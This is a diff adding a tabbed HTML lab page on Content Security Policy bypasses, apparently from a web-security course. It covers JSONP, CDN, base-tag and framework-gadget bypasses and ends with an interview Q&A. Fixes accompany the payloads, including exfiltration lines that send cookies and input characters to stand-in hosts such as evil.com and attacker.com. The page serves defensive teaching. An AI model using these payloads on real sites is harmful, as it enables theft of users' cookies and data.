@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Lab 04 — CSP Bypass Techniques</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{background:#0f1117;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;padding:24px;line-height:1.6}h1{font-size:1.5rem;color:#8b5cf6;margin-bottom:4px}.sub{color:#94a3b8;font-size:.85rem;margin-bottom:20px}.tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}.tab{padding:7px 14px;border-radius:8px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem}.tab.active{background:#2a1a3a;border-color:#8b5cf6;color:#8b5cf6}.panel{display:none}.panel.active{display:block}.card{background:#1e2130;border:1px solid #2d3551;border-radius:12px;padding:20px;margin-bottom:14px}.card h3{color:#8b5cf6;margin-bottom:10px;font-size:.95rem}pre{background:#0f1117;border:1px solid #2d3551;border-radius:8px;padding:14px;overflow-x:auto;font-size:.78rem;line-height:1.7;white-space:pre-wrap}.kw{color:#60a5fa}.str{color:#10b981}.cm{color:#475569}.fn{color:#a78bfa}.danger{color:#ef4444}button{padding:8px 16px;border-radius:6px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem;margin:3px}button:hover{border-color:#8b5cf6;color:#8b5cf6}.output{background:#0d1117;border:1px solid #2d3551;border-radius:8px;padding:12px;font-family:monospace;font-size:.78rem;min-height:80px;max-height:400px;overflow:auto;white-space:pre-wrap;margin-top:8px}
+</style>
+</head>
+<body>
+<h1>🟣 Lab 04 — CSP Bypass Techniques</h1>
+<p class="sub">Module 12.3 · Common CSP weaknesses and how attackers exploit them</p>
+<div class="tabs">
+  <div class="tab active" onclick="setTab(0)">Common Bypasses</div>
+  <div class="tab" onclick="setTab(1)">JSONP & Base Tag</div>
+  <div class="tab" onclick="setTab(2)">Data Exfiltration</div>
+  <div class="tab" onclick="setTab(3)">Interview Q&A</div>
+</div>
+
+<div class="panel active" id="p0">
+  <div class="card">
+    <h3>CSP Bypass Techniques</h3>
+    <pre><span class="cm">// ═══ 1. unsafe-inline bypass ═══</span>
+<span class="cm">// If policy has 'unsafe-inline': XSS works directly</span>
+script-src <span class="str">'self'</span> <span class="danger">'unsafe-inline'</span>
+<span class="cm">// Attacker injects: &lt;script&gt;steal()&lt;/script&gt; → runs!</span>
+<span class="cm">// Fix: Remove 'unsafe-inline', use nonces</span>
+
+<span class="cm">// ═══ 2. Overly broad allowlist ═══</span>
+script-src <span class="danger">*.googleapis.com</span>
+<span class="cm">// googleapis.com hosts JSONP endpoints!</span>
+<span class="cm">// Attacker: &lt;script src="https://accounts.googleapis.com/o/</span>
+<span class="cm">//   oauth2/revoke?callback=alert(1)"&gt;</span>
+<span class="cm">// The JSONP endpoint executes attacker's callback</span>
+
+<span class="cm">// ═══ 3. CDN bypass ═══</span>
+script-src <span class="danger">https://cdnjs.cloudflare.com</span>
+<span class="cm">// Attacker loads Angular from cdnjs, then uses ng-app</span>
+<span class="cm">// to execute arbitrary expressions via template injection</span>
+
+<span class="cm">// ═══ 4. unsafe-eval bypass ═══</span>
+script-src <span class="str">'self'</span> <span class="danger">'unsafe-eval'</span>
+<span class="cm">// Attacker can use: eval(), new Function(), setTimeout("code")</span>
+<span class="cm">// Even DOM-based XSS sinks work</span>
+
+<span class="cm">// ═══ 5. Missing directives ═══</span>
+script-src <span class="str">'self'</span>
+<span class="cm">// Missing object-src → attacker loads Flash/Java plugin</span>
+<span class="cm">// Missing base-uri → attacker injects &lt;base href&gt;</span></pre>
+  </div>
+</div>
+
+<div class="panel" id="p1">
+  <div class="card">
+    <h3>JSONP & Base Tag Attacks</h3>
+    <pre><span class="cm">// ═══ JSONP Bypass ═══</span>
+<span class="cm">// Many Google/Facebook APIs support JSONP</span>
+<span class="cm">// JSONP wraps response in a function call:</span>
+<span class="cm">// GET /api?callback=myFunc → myFunc({"data":"..."})</span>
+
+<span class="cm">// If CSP allows the JSONP host:</span>
+script-src <span class="str">'self'</span> https://api.google.com
+<span class="cm">// Attacker injects:</span>
+&lt;script src=<span class="danger">"https://api.google.com/endpoint?callback=alert"</span>&gt;&lt;/script&gt;
+<span class="cm">// Server returns: alert({...}) → XSS!</span>
+
+<span class="cm">// Fix: Use strict-dynamic + nonces (ignores URL allowlists)</span>
+
+<span class="cm">// ═══ Base Tag Injection ═══</span>
+<span class="cm">// If base-uri is not restricted:</span>
+<span class="cm">// Attacker injects: &lt;base href="https://evil.com/"&gt;</span>
+<span class="cm">// All relative script paths now load from evil.com!</span>
+<span class="cm">// &lt;script src="/app.js"&gt; → loads evil.com/app.js</span>
+
+<span class="cm">// Fix:</span>
+Content-Security-Policy: base-uri <span class="str">'self'</span>
+
+<span class="cm">// ═══ Script Gadgets (Framework-based) ═══</span>
+<span class="cm">// Angular: {{constructor.constructor('alert(1)')()}}</span>
+<span class="cm">// Knockout: data-bind="value: alert(1)"</span>
+<span class="cm">// Mavo: mv-expressions="alert(1)"</span>
+<span class="cm">// If the framework JS is CSP-allowed, gadgets bypass CSP</span></pre>
+  </div>
+</div>
+
+<div class="panel" id="p2">
+  <div class="card">
+    <h3>Data Exfiltration Despite CSP</h3>
+    <pre><span class="cm">// Even strict CSP may not prevent data exfiltration</span>
+
+<span class="cm">// 1. DNS prefetch (if connect-src blocks fetch)</span>
+&lt;link rel=<span class="str">"dns-prefetch"</span>
+  href=<span class="danger">"//stolen-data.attacker.com"</span>&gt;
+<span class="cm">// Browser makes DNS query → attacker's DNS server logs it</span>
+
+<span class="cm">// 2. CSS-based exfiltration</span>
+<span class="cm">// If style-src allows attacker's origin:</span>
+input[value^=<span class="str">"a"</span>] { background: url(<span class="danger">"//evil.com/?char=a"</span>) }
+input[value^=<span class="str">"b"</span>] { background: url(<span class="danger">"//evil.com/?char=b"</span>) }
+<span class="cm">// Extracts input values character by character</span>
+
+<span class="cm">// 3. WebRTC leak</span>
+<span class="cm">// WebRTC can make connections not governed by connect-src</span>
+
+<span class="cm">// 4. Navigation-based</span>
+<span class="cm">// window.location = "//evil.com/?" + document.cookie</span>
+<span class="cm">// Fix: navigate-to directive (experimental)</span>
+
+<span class="cm">// Comprehensive defense:</span>
+Content-Security-Policy:
+  default-src <span class="str">'none'</span>;
+  script-src <span class="str">'nonce-{random}'</span> <span class="str">'strict-dynamic'</span>;
+  connect-src <span class="str">'self'</span>;
+  style-src <span class="str">'self'</span>;
+  img-src <span class="str">'self'</span>;
+  base-uri <span class="str">'self'</span>;
+  form-action <span class="str">'self'</span>;
+  frame-ancestors <span class="str">'none'</span>;
+  object-src <span class="str">'none'</span></pre>
+  </div>
+</div>
+
+<div class="panel" id="p3">
+  <div class="card">
+    <h3>Google Senior Frontend — CSP Bypasses</h3>
+    <div style="font-size:.82rem">
+      <p><strong style="color:#60a5fa">Q: Your CSP uses script-src 'self' https://cdn.jsdelivr.net. Is this secure?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">No. CDN allowlisting is a well-known CSP bypass. Attack: (1) jsdelivr hosts millions of packages. Attacker finds one that executes arbitrary code (or uploads their own npm package). (2) Attacker injects: &lt;script src="https://cdn.jsdelivr.net/npm/evil-package"&gt;&lt;/script&gt; — CSP allows it because the origin matches. (3) Same with cdnjs, unpkg, googleapis. Google's research: 95% of CSP policies with URL allowlists are bypassable. Fix: Replace URL allowlists with nonce-based CSP + strict-dynamic. script-src 'nonce-{random}' 'strict-dynamic'; — This ignores URL allowlists entirely. Only scripts with the correct nonce run. Scripts they dynamically load are also trusted. For CDN scripts: add nonce attribute to the script tag. The CDN origin doesn't need to be in the policy.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const tabs=document.querySelectorAll('.tab'),panels=document.querySelectorAll('.panel');
+function setTab(i){tabs.forEach((t,j)=>{t.classList.toggle('active',j===i);panels[j].classList.toggle('active',j===i)})}
+</script>
+</body></html>
